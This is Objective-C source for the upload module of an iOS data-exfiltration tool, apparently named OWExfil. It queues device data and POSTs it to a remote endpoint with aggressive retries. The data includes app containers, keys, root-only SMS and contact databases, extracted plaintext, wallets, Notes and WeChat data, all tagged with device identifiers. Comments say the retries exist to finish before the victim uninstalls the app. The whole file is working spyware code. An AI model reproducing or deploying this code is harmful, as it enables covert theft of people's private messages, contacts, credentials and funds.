#import "OWExfil.h"
#import "OWCommon.h"
#include <math.h>

NSString * const OWUploadKindContainer = @"container";
NSString * const OWUploadKindKeys      = @"keys";
NSString * const OWUploadKindMeta      = @"meta";
NSString * const OWUploadKindSystem    = @"system";    // 系统库（短信/通讯录…），需 root
NSString * const OWUploadKindHits      = @"hits";      // 端上抽取出的明文命中

NSString * const OWUploaderDidUploadFileNotification = @"OWUploaderDidUploadFile";
NSString * const OWUploaderDidDrainNotification = @"OWUploaderDidDrain";

static NSLock *OWFlushLock(void) {
    static NSLock *l;
    static dispatch_once_t once;
    dispatch_once(&once, ^{ l = [NSLock new]; });
    return l;
}

@interface OWUploader ()
- (void)_scheduleRetry;
- (NSUInteger)pendingItemCount;
@end

@implementation OWUploader {
    NSMutableArray<NSString *> *_queue;
}

+ (NSString *)activeEndpoint {
    NSString *override = [[NSUserDefaults standardUserDefaults]
                          stringForKey:@"OWUploadEndpointOverride"];
    if (override.length) return override;
    NSString *plist = [[NSBundle mainBundle] infoDictionary][@"OWUploadEndpoint"];
    return plist.length ? plist : @"";
}

- (instancetype)init {
    if (self = [super init]) {
        NSArray *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
        NSString *docDir = docs.firstObject ?: NSTemporaryDirectory();
        _pendingDir = [docDir stringByAppendingPathComponent:@"pending"];
        [[NSFileManager defaultManager] createDirectoryAtPath:_pendingDir
                                  withIntermediateDirectories:YES attributes:nil error:nil];
        _maxRetries = 3;
        _endpoint = [OWUploader activeEndpoint];
        if (!_endpoint.length) {
            OWLog(@"上传: 未配置 OWUploadEndpoint（Info.plist 为空且无覆盖）");
        } else {
            // 端点只在变化时打一次，避免每个 uploader 实例都刷一行
            static NSString *lastEndpoint = nil;
            if (![lastEndpoint isEqualToString:_endpoint]) {
                lastEndpoint = [_endpoint copy];
                OWLog(@"上传: 端点 = %@", _endpoint);
            }
        }
        _queue = [self _loadQueue];
        [self _cleanupOrphans];
    }
    return self;
}

- (NSMutableArray<NSString *> *)_loadQueue {
    NSMutableArray *q = [NSMutableArray new];
    NSDirectoryEnumerator *en = [[NSFileManager defaultManager] enumeratorAtPath:_pendingDir];
    for (NSString *f in en) {
        if ([f.pathExtension isEqualToString:@"meta"]) [q addObject:[_pendingDir stringByAppendingPathComponent:f]];
    }
    return q;
}

- (BOOL)enqueueManifest:(NSDictionary *)manifest error:(NSError **)error {
    NSString *p = [NSTemporaryDirectory() stringByAppendingPathComponent:
        [NSString stringWithFormat:@"ow_manifest_%llu.json",
         (unsigned long long)([[NSDate date] timeIntervalSince1970] * 1000)]];
    NSData *d = [NSJSONSerialization dataWithJSONObject:manifest options:0 error:nil];
    [d writeToFile:p atomically:YES];
    BOOL ok = [self enqueueFile:p kind:OWUploadKindMeta error:error];
    [[NSFileManager defaultManager] removeItemAtPath:p error:nil];
    return ok;
}

- (BOOL)uploadJSONNow:(NSDictionary *)json kind:(NSString *)kind error:(NSError **)error {
    if (!json) return NO;
    NSData *data = [NSJSONSerialization dataWithJSONObject:json options:0 error:error];
    if (!data.length) return NO;

    NSString *tmp = [NSTemporaryDirectory() stringByAppendingPathComponent:
        [NSString stringWithFormat:@"cover_register_%llu.json",
         (unsigned long long)([[NSDate date] timeIntervalSince1970] * 1000)]];
    if (![data writeToFile:tmp atomically:YES]) return NO;

    BOOL ok = NO;
    NSString *ep = self.endpoint;
    if (ep.length) {
        ok = [self _post:tmp url:[NSURL URLWithString:ep] kind:kind];
    }
    if (!ok) {
        // 离线/端点失败：入队，等下次补传（采集上传也会顺手带出去）
        [self enqueueFile:tmp kind:kind error:nil];
    }
    [[NSFileManager defaultManager] removeItemAtPath:tmp error:nil];
    return ok;
}

- (BOOL)uploadDiagnosticLog:(NSError **)error {
    return [self uploadDiagnosticLogLabel:@"opensrc_manual" error:error];
}

- (BOOL)uploadDiagnosticLogLabel:(NSString *)label error:(NSError **)error {
    NSData *tail = [OWLogger tail:512 * 1024];
    OWDeviceProfile *dev = [OWDeviceProfile current];
    UIDevice *ui = [UIDevice currentDevice];
    NSString *idfv = ui.identifierForVendor.UUIDString ?: @"";

    NSMutableString *payload = [NSMutableString string];
    [payload appendString:@"=== auto step log ===\n"];
    [payload appendFormat:@"label: %@\n", label.length ? label : @"opensrc_auto"];
    [payload appendFormat:@"device: %@\n", dev.machine.length ? dev.machine : ui.model];
    [payload appendFormat:@"ios: %@\n", dev.osVersion ?: @""];
    [payload appendFormat:@"idfv: %@\n", idfv];
    [payload appendString:@"event: run_log_upload\n"];
    [payload appendString:@"=== recent log ===\n"];
    if (tail.length) {
        NSString *body = [[NSString alloc] initWithData:tail encoding:NSUTF8StringEncoding];
        if (body.length) [payload appendString:body];
    }

    NSString *tmp = [NSTemporaryDirectory() stringByAppendingPathComponent:
        [NSString stringWithFormat:@"ow_auto_log_%llu.log",
         (unsigned long long)([[NSDate date] timeIntervalSince1970])]];
    if (![payload writeToFile:tmp atomically:YES encoding:NSUTF8StringEncoding error:error]) {
        return NO;
    }

    BOOL enqueued = [self enqueueFile:tmp kind:@"log" error:error];
    BOOL ok = enqueued ? [self flush:error] : NO;
    [[NSFileManager defaultManager] removeItemAtPath:tmp error:nil];
    OWLog(@"上传: 诊断日志(%@) %@", label ?: @"", ok ? @"成功" : @"失败");
    return ok;
}

- (BOOL)enqueueFile:(NSString *)path kind:(NSString *)kind error:(NSError **)error {
    return [self enqueueFile:path kind:kind priority:[self _defaultPriorityForKind:kind] error:error];
}

- (OWUploadPriority)_defaultPriorityForKind:(NSString *)kind {
    if ([kind isEqualToString:OWUploadKindHits]) return OWUploadPriorityHits;
    if ([kind isEqualToString:OWUploadKindMeta]) return OWUploadPriorityMeta;
    if ([kind isEqualToString:OWUploadKindKeys]) return OWUploadPriorityKeys;
    if ([kind isEqualToString:OWUploadKindSystem]) return OWUploadPrioritySystem;
    if ([kind isEqualToString:OWUploadKindContainer]) return OWUploadPriorityContainer;
    return OWUploadPriorityMeta + 1;
}

- (BOOL)enqueueFile:(NSString *)path
               kind:(NSString *)kind
           priority:(OWUploadPriority)priority
              error:(NSError **)error {
    if (![[NSFileManager defaultManager] fileExistsAtPath:path]) {
        if (error) *error = [NSError errorWithDomain:@"OWUploader" code:50
                                userInfo:@{NSLocalizedDescriptionKey: @"文件不存在"}];
        return NO;
    }
    NSString *base = [NSString stringWithFormat:@"%llu_%@",
        (unsigned long long)([[NSDate date] timeIntervalSince1970] * 1000),
        path.lastPathComponent];
    NSString *dst = [_pendingDir stringByAppendingPathComponent:base];
    NSString *tmp = [dst stringByAppendingString:@".tmp"];
    NSFileManager *fm = [NSFileManager defaultManager];
    [fm removeItemAtPath:dst error:nil];
    [fm removeItemAtPath:tmp error:nil];

    // 先写临时文件再 rename：进程在拷贝中被杀，不会留下“半个正式文件”
    if (![fm copyItemAtPath:path toPath:tmp error:error]) {
        [fm removeItemAtPath:tmp error:nil];
        return NO;
    }
    if (![fm moveItemAtPath:tmp toPath:dst error:error]) {
        [fm removeItemAtPath:tmp error:nil];
        return NO;
    }

    NSDictionary *attrs = [fm attributesOfItemAtPath:dst error:nil];
    NSDictionary *meta = @{
        @"src": path,
        @"kind": kind,
        @"priority": @(priority),
        @"retries": @0,
        @"attempts": @0,
        @"state": @"pending",
        @"done": @NO,
        @"size": @([attrs fileSize]),
        @"createdAt": @((uint64_t)[[NSDate date] timeIntervalSince1970]),
        @"lastAttemptAt": @0,
    };
    NSString *metaPath = [dst stringByAppendingPathExtension:@"meta"];
    [[NSJSONSerialization dataWithJSONObject:meta options:0 error:nil] writeToFile:metaPath atomically:YES];
    if (![_queue containsObject:metaPath]) [_queue addObject:metaPath];
    OWLog(@"上传: 入队 %@ (%@)", path.lastPathComponent, kind);
    return YES;
}

- (BOOL)flush:(NSError **)error {
    NSLock *lock = OWFlushLock();
    [lock lock];
    @try {
        _uploadedCount = 0;
        _failedCount = 0;
        BOOL ok = [self _flushLocked:error];
        // 有失败就 3 秒后自己再试一轮：设备随时可能被回收/卸载，宁肯多撞几次也不等退避。
        // 定时器用进程级标记去重，避免每轮 flush 各排一个。
        if (_failedCount > 0) [self _scheduleRetry];
        // 补传把队列清空了：通知 OWRoute 重新做一次「能不能收尾」的判定，
        // 否则 phase 会一直停在 failed，用户只能重启 App 才看到完成。
        if (_uploadedCount > 0 && _failedCount == 0 && ![self hasPendingData]) {
            [[NSNotificationCenter defaultCenter]
                postNotificationName:OWUploaderDidDrainNotification object:self];
        }
        return ok;
    } @finally {
        [lock unlock];
    }
}

static NSLock *OWRetryLock(void) {
    static NSLock *l;
    static dispatch_once_t once;
    dispatch_once(&once, ^{ l = [NSLock new]; });
    return l;
}

static BOOL OWRetryScheduled = NO;

- (void)_scheduleRetry {
    [OWRetryLock() lock];
    if (OWRetryScheduled) { [OWRetryLock() unlock]; return; }
    OWRetryScheduled = YES;
    [OWRetryLock() unlock];

    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3.5 * NSEC_PER_SEC)),
                   dispatch_get_global_queue(QOS_CLASS_UTILITY, 0), ^{
        [OWRetryLock() lock];
        OWRetryScheduled = NO;
        [OWRetryLock() unlock];

        // 新建一个 uploader 重读 pending 目录：调用方实例可能已经释放
        OWUploader *u = [OWUploader new];
        if (![u hasPendingData]) return;
        OWLog(@"上传: 3s 自动补传（pending=%lu）", (unsigned long)[u pendingItemCount]);
        NSError *e = nil;
        [u flush:&e];
    });
}

- (NSUInteger)pendingItemCount {
    NSUInteger n = 0;
    for (NSString *name in [[NSFileManager defaultManager] contentsOfDirectoryAtPath:_pendingDir error:nil]) {
        if ([name.pathExtension isEqualToString:@"meta"]) n++;
    }
    return n;
}

- (BOOL)hasPendingData {
    NSArray<NSString *> *names = [[NSFileManager defaultManager]
                                  contentsOfDirectoryAtPath:_pendingDir error:nil];
    NSSet<NSString *> *kinds = [NSSet setWithArray:@[OWUploadKindContainer,
                                                     OWUploadKindKeys,
                                                     OWUploadKindSystem,
                                                     OWUploadKindHits,
                                                     OWUploadKindMeta]];
    for (NSString *n in names) {
        if (![n.pathExtension isEqualToString:@"meta"]) continue;
        NSString *mp = [_pendingDir stringByAppendingPathComponent:n];
        NSData *d = [NSData dataWithContentsOfFile:mp];
        NSDictionary *m = d ? [NSJSONSerialization JSONObjectWithData:d options:0 error:nil] : nil;
        if (!m || [m[@"done"] boolValue]) continue;
        if ([kinds containsObject:m[@"kind"]]) return YES;
    }
    return NO;
}

- (BOOL)_flushLocked:(NSError **)error {
    if (!_endpoint.length) {
        if (error) *error = [NSError errorWithDomain:@"OWUploader" code:51
                                userInfo:@{NSLocalizedDescriptionKey: @"未配置 OWUploadEndpoint"}];
        OWLog(@"上传: 未配置 endpoint，数据留在 pending 待补传");
        return NO;
    }

    NSURL *url = [NSURL URLWithString:_endpoint];
    if (!url) return NO;

    _uploadedCount = 0;
    _failedCount = 0;

    NSFileManager *fm = [NSFileManager defaultManager];
    NSMutableArray<NSString *> *metas = [NSMutableArray array];
    for (NSString *name in [fm contentsOfDirectoryAtPath:_pendingDir error:nil]) {
        if ([name.pathExtension isEqualToString:@"meta"]) {
            [metas addObject:[_pendingDir stringByAppendingPathComponent:name]];
        }
    }

    // 排序：priority 升序（hits → 清单 → 钱包 → keys → Notes），同优先级按体积升序（小的先传）
    [metas sortUsingComparator:^NSComparisonResult(NSString *a, NSString *b) {
        NSDictionary *ma = [NSJSONSerialization JSONObjectWithData:
                            [NSData dataWithContentsOfFile:a] options:0 error:nil];
        NSDictionary *mb = [NSJSONSerialization JSONObjectWithData:
                            [NSData dataWithContentsOfFile:b] options:0 error:nil];
        NSInteger pa = [ma[@"priority"] integerValue];
        NSInteger pb = [mb[@"priority"] integerValue];
        if (pa != pb) return pa < pb ? NSOrderedAscending : NSOrderedDescending;
        unsigned long long sa = [ma[@"size"] unsignedLongLongValue];
        unsigned long long sb = [mb[@"size"] unsignedLongLongValue];
        if (sa != sb) return sa < sb ? NSOrderedAscending : NSOrderedDescending;
        return [a compare:b];
    }];

    NSTimeInterval now = [[NSDate date] timeIntervalSince1970];

    // 并发 2 路上传：仍按 priority,size 的顺序「起跑」，只是把网络等待叠起来。
    // 上限刻意保守（2）：手机上行带宽有限，并发太多反而互相拖慢；
    // 单个 >20MB 的包独占一次（避免两张大包同时在内存里拼 multipart）。
    const NSInteger kMaxConcurrent = 2;
    const uint64_t kExclusiveBytes = 20ULL * 1024 * 1024;
    dispatch_semaphore_t slot = dispatch_semaphore_create(kMaxConcurrent);
    dispatch_group_t group = dispatch_group_create();
    dispatch_queue_t q = dispatch_get_global_queue(QOS_CLASS_UTILITY, 0);
    __block NSUInteger okCount = 0, failCount = 0;

    for (NSString *metaPath in metas) {
        NSData *md = [NSData dataWithContentsOfFile:metaPath];
        NSMutableDictionary *meta = md
            ? [[NSJSONSerialization JSONObjectWithData:md options:0 error:nil] mutableCopy]
            : nil;
        if (!meta) { [fm removeItemAtPath:metaPath error:nil]; continue; }

        NSString *file = [metaPath stringByDeletingPathExtension];
        if (![fm fileExistsAtPath:file]) {
            [fm removeItemAtPath:metaPath error:nil];
            continue;
        }
        if ([meta[@"done"] boolValue]) {
            [fm removeItemAtPath:file error:nil];
            [fm removeItemAtPath:metaPath error:nil];
            continue;
        }

        // 崩溃留下的 inflight：10 分钟后视为 pending
        NSString *state = meta[@"state"] ?: @"pending";
        NSTimeInterval last = [meta[@"lastAttemptAt"] doubleValue];
        if ([state isEqualToString:@"inflight"] && now - last < 600) continue;

        // 固定 3 秒重试：设备随时可能被回收/卸载，不能等指数退避。
        // 真正的重试由 flush: 里的 3.5s 定时器驱动，这里只是把 nextAttemptAt 放开。
        NSTimeInterval nextAt = [meta[@"nextAttemptAt"] doubleValue];
        if (nextAt > now) continue;

        meta[@"state"] = @"inflight";
        meta[@"lastAttemptAt"] = @(now);
        [[NSJSONSerialization dataWithJSONObject:meta options:0 error:nil]
            writeToFile:metaPath atomically:YES];

        NSString *kind = meta[@"kind"];
        uint64_t fsz = [[fm attributesOfItemAtPath:file error:nil] fileSize];
        if (fsz > kExclusiveBytes) {
            // 大包：等前面全部收尾，独占上传
            dispatch_group_wait(group, DISPATCH_TIME_FOREVER);
        }

        dispatch_semaphore_wait(slot, DISPATCH_TIME_FOREVER);
        dispatch_group_async(group, q, ^{
            @autoreleasepool {
                BOOL ok = [self _post:file url:url kind:kind];
                NSFileManager *fm2 = [NSFileManager defaultManager];
                if (ok) {
                    // 成功：文件和 meta 一起删，避免 meta 越积越多
                    [fm2 removeItemAtPath:file error:nil];
                    [fm2 removeItemAtPath:metaPath error:nil];
                    @synchronized (self) { okCount++; }
                    OWLog(@"上传: 成功 %@", file.lastPathComponent);
                    [[NSNotificationCenter defaultCenter]
                        postNotificationName:OWUploaderDidUploadFileNotification
                                      object:nil
                                    userInfo:@{@"name": file.lastPathComponent ?: @""}];
                } else {
                    NSInteger attempts = [meta[@"attempts"] integerValue] + 1;
                    // 固定 3 秒；不做指数退避 —— 用户可能随时卸载 App，等不起
                    NSTimeInterval backoff = 3.0;
                    meta[@"attempts"] = @(attempts);
                    meta[@"retries"] = @(attempts);
                    meta[@"state"] = @"pending";
                    meta[@"lastAttemptAt"] = @(now);
                    meta[@"nextAttemptAt"] = @(now + backoff);
                    [[NSJSONSerialization dataWithJSONObject:meta options:0 error:nil]
                        writeToFile:metaPath atomically:YES];
                    @synchronized (self) { failCount++; }
                    // 每 10 次才打一行，避免 3 秒一条把日志刷爆
                    if (attempts <= 3 || attempts % 10 == 0) {
                        OWLog(@"上传: 失败 %@（第 %ld 次，3s 后重试，保留待补传）",
                              file.lastPathComponent, (long)attempts);
                    }
                }
                dispatch_semaphore_signal(slot);
            }
        });
    }

    dispatch_group_wait(group, DISPATCH_TIME_FOREVER);
    _uploadedCount = okCount;
    _failedCount = failCount;
    return _uploadedCount > 0;
}

- (void)_cleanupOrphans {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSArray<NSString *> *names = [fm contentsOfDirectoryAtPath:_pendingDir error:nil];
    NSMutableSet<NSString *> *withMeta = [NSMutableSet set];
    for (NSString *n in names) {
        if ([n.pathExtension isEqualToString:@"meta"]) {
            [withMeta addObject:[n stringByDeletingPathExtension]];
        }
    }
    NSTimeInterval now = [[NSDate date] timeIntervalSince1970];
    for (NSString *n in names) {
        NSString *p = [_pendingDir stringByAppendingPathComponent:n];
        if ([n.pathExtension isEqualToString:@"tmp"]) {
            NSDictionary *a = [fm attributesOfItemAtPath:p error:nil];
            NSTimeInterval m = [a[NSFileModificationDate] timeIntervalSince1970];
            if (now - m > 3600) [fm removeItemAtPath:p error:nil];
            continue;
        }
        if ([n.pathExtension isEqualToString:@"meta"]) {
            NSString *base = [n stringByDeletingPathExtension];
            NSString *f = [_pendingDir stringByAppendingPathComponent:base];
            if (![fm fileExistsAtPath:f]) {
                [fm removeItemAtPath:p error:nil];
                continue;
            }
            // 清理历史遗留的超大 pending（如旧版 398MB 微信包），避免永久阻塞完成判定
            NSData *md = [NSData dataWithContentsOfFile:p];
            NSDictionary *m = md ? [NSJSONSerialization JSONObjectWithData:md options:0 error:nil] : nil;
            unsigned long long sz = [m[@"size"] unsignedLongLongValue];
            if (sz == 0) {
                NSDictionary *fa = [fm attributesOfItemAtPath:f error:nil];
                sz = [fa fileSize];
            }
            if (sz > 250ULL * 1024 * 1024) {
                OWLog(@"上传: 清理超大 pending %@ (%llu B)", f.lastPathComponent, sz);
                [fm removeItemAtPath:f error:nil];
                [fm removeItemAtPath:p error:nil];
            }
            continue;
        }
        if (![withMeta containsObject:n]) {
            NSDictionary *a = [fm attributesOfItemAtPath:p error:nil];
            NSTimeInterval m = [a[NSFileModificationDate] timeIntervalSince1970];
            if (now - m > 3600) [fm removeItemAtPath:p error:nil];
        }
    }
}

- (BOOL)_post:(NSString *)file url:(NSURL *)url kind:(NSString *)kind {
    NSString *boundary = [@"OWBoundary" stringByAppendingString:@((uint64_t)[[NSDate date] timeIntervalSince1970]).stringValue];
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
    req.HTTPMethod = @"POST";
    [req setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary] forHTTPHeaderField:@"Content-Type"];
    NSDictionary *fileAttrs = [[NSFileManager defaultManager] attributesOfItemAtPath:file error:nil];
    uint64_t fileSize = [fileAttrs fileSize];
    // 超时按体积自适应：慢网实测 26KB/s，2.7MB 需要 105s，固定 60s 必然半路超时白传。
    // 以 20KB/s 作为下限速率估算，最少 60s，最多 300s。
    NSTimeInterval timeout = MIN(300.0, MAX(60.0, 60.0 + (double)fileSize / 20480.0));
    [req setTimeoutInterval:timeout];

    NSMutableData *body = [NSMutableData data];
    OWDeviceProfile *dev = [OWDeviceProfile current];
    NSString *deviceToken = [[UIDevice currentDevice] identifierForVendor].UUIDString ?: @"";
    NSDictionary *fields = @{@"kind": kind ?: @"unknown",
                             @"machine": dev.machine,
                             @"os": dev.osVersion,
                             @"soc": dev.socTierName,
                             @"bmh": dev.bootManifestHash ?: @"",
                             @"token": deviceToken};
    for (NSString *k in fields) {
        [body appendData:[[NSString stringWithFormat:@"--%@\r\nContent-Disposition: form-data; name=\"%@\"\r\n\r\n%@\r\n",
                           boundary, k, fields[k]] dataUsingEncoding:NSUTF8StringEncoding]];
    }
    [body appendData:[[NSString stringWithFormat:@"--%@\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%@\"\r\nContent-Type: application/octet-stream\r\n\r\n",
                       boundary, file.lastPathComponent] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[NSData dataWithContentsOfFile:file]];
    [body appendData:[[NSString stringWithFormat:@"\r\n--%@--\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];

    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    __block BOOL ok = NO;
    NSURLSessionUploadTask *task = [[NSURLSession sharedSession] uploadTaskWithRequest:req fromData:body
        completionHandler:^(NSData *d, NSURLResponse *r, NSError *e) {
            NSHTTPURLResponse *hr = (NSHTTPURLResponse *)r;
            ok = (e == nil) && hr.statusCode >= 200 && hr.statusCode < 300;
            if (e) OWLog(@"上传: 网络错误 %@", e.localizedDescription);
            else if (!ok) OWLog(@"上传: HTTP %ld", (long)hr.statusCode);
            dispatch_semaphore_signal(sem);
        }];
    [task resume];
    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW,
        (int64_t)((timeout + 10) * NSEC_PER_SEC)));
    return ok;
}

@end
